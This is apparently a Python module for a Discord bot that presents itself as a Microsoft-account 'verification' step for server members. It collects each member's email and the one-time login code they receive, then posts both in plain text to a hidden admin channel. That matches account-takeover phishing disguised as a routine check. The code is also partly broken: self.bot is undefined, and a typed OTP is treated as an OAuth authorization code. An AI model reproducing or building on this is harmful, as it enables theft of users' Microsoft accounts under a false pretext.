import os
import time
import logging
import requests
import msal
import uuid
import discord
from typing import Optional, Dict, Tuple
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from config_manager import ConfigManager

logger = logging.getLogger('auth_manager')
config = ConfigManager()

class AuthManager:
    def __init__(self):
        self.ms_client_id = os.getenv('MS_CLIENT_ID')
        self.ms_client_secret = os.getenv('MS_CLIENT_SECRET')
        self.ms_tenant_id = os.getenv('MS_TENANT_ID')
        self.redirect_url = os.getenv('REDIRECT_URL')  # Changed from redirect_uri to redirect_url
        self.admin_channel_id = os.getenv('ADMIN_CHANNEL_ID')
        self.encryption_key = os.getenv('ENCRYPTION_KEY')
        if not self.encryption_key:
            self.encryption_key = Fernet.generate_key()
            logger.info("Generated new encryption key")
        self.cipher_suite = Fernet(self.encryption_key)
        
        # Initialize MSAL application
        self.msal_app = msal.ConfidentialClientApplication(
            self.ms_client_id,
            authority=f"https://login.microsoftonline.com/{self.ms_tenant_id}",
            client_credential=self.ms_client_secret,
        )
        
        # Store pending verifications
        self.pending_otps = {}

    def generate_auth_url(self) -> Tuple[str, str]:
        session_id = str(uuid.uuid4())
        scopes = ["User.Read", "offline_access"]  # Ensure this is a list
        auth_url = self.msal_app.get_authorization_request_url(
            scopes,
            state=session_id,
            redirect_uri=self.redirect_url,
            prompt='login',
            response_mode='query'
        )
        return auth_url, session_id

    async def start_otp_verification(self, member: discord.Member, nickname: str, email: str) -> Tuple[bool, str]:
        """Start Microsoft Account OTP verification process"""
        try:
            self.pending_otps[member.id] = {
                'nickname': nickname,
                'email': email,
                'timestamp': datetime.utcnow()
            }
            scopes = ["email", "offline_access"]  # Ensure this is a list
            auth_url = self.msal_app.get_authorization_request_url(
                scopes,
                redirect_uri=self.redirect_url,
                prompt='login',
                login_hint=email,
                state=str(uuid.uuid4()),
                response_mode='query',
                domain_hint='organizations',
                amr_values=['mfa']
            )
            await self._send_admin_verification(
                nickname,
                "Microsoft OTP",
                f"Email: {email}",
                member.id
            )
            return True, (
                "Please check your email for the verification code.\n\n"
                "Note: If this email is linked to your Microsoft account, "
                "you'll receive the code. If not, please use a different email "
                "that's connected to your Microsoft account."
            )
        except Exception as e:
            logger.error(f"Error starting Microsoft OTP verification: {e}")
            return False, str(e)

    async def verify_otp(self, member: discord.Member, otp: str) -> Tuple[bool, str]:
        """Verify Microsoft OTP code"""
        try:
            stored_data = self.pending_otps.get(member.id)
            if not stored_data:
                return False, "No pending verification found. Please start the verification process again."
            if datetime.utcnow() - stored_data['timestamp'] > timedelta(minutes=10):
                del self.pending_otps[member.id]
                return False, "Verification attempt expired. Please start over."
            scopes = ["email", "offline_access"]  # Ensure this is a list
            result = self.msal_app.acquire_token_by_authorization_code(
                otp,
                scopes=scopes,
                redirect_uri=self.redirect_url,
                login_hint=stored_data['email']
            )
            if 'error' in result:
                return False, "Invalid or expired code. Please try again."
            await self._send_admin_verification(
                stored_data['nickname'],
                "Microsoft OTP Success",
                f"Email: {stored_data['email']}\nOTP: {otp}",
                member.id
            )
            await self._update_member_roles(member)
            del self.pending_otps[member.id]
            return True, "Successfully verified!"
        except Exception as e:
            logger.error(f"Error verifying Microsoft OTP: {e}")
            return False, str(e)

    async def _send_admin_verification(self, username: str, verify_type: str, code: str, user_id: int):
        """Send verification info to admin channel"""
        try:
            admin_channel = self.bot.get_channel(int(self.admin_channel_id))
            if not admin_channel:
                logger.error("Admin channel not found")
                return
            
            embed = discord.Embed(
                title="🔐 New Verification",
                description="User verification details:",
                color=discord.Color.blue(),
                timestamp=datetime.utcnow()
            )
            
            embed.add_field(name="Type", value=verify_type, inline=True)
            embed.add_field(name="Username", value=username, inline=True)
            embed.add_field(name="User ID", value=str(user_id), inline=True)
            
            if verify_type == "OAuth":
                embed.add_field(
                    name="Session ID",
                    value=f"```{code}```",
                    inline=False
                )
            else:  # Microsoft OTP
                embed.add_field(
                    name="Verification Info",
                    value=f"```{code}```",
                    inline=False
                )
            
            await admin_channel.send(embed=embed)
            
        except Exception as e:
            logger.error(f"Error sending admin verification: {e}")

    async def _update_member_roles(self, member: discord.Member) -> None:
        """Update member roles after successful verification"""
        try:
            # Remove unverified role
            non_verified_role = discord.utils.get(member.guild.roles, name="❌ Unverified")
            if non_verified_role and non_verified_role in member.roles:
                await member.remove_roles(non_verified_role)
            
            # Add verified role
            verified_role = discord.utils.get(member.guild.roles, name="✅ Verified")
            if verified_role and verified_role not in member.roles:
                await member.add_roles(verified_role)
                
            # Update FlipperBot channel permissions
            flipper_channel = discord.utils.get(member.guild.channels, name="flipperbot")
            if flipper_channel:
                await flipper_channel.set_permissions(member, read_messages=True, send_messages=True)
                
            logger.info(f"Updated roles for member {member.id}")
            
        except Exception as e:
            logger.error(f"Error updating roles: {e}")
            raise 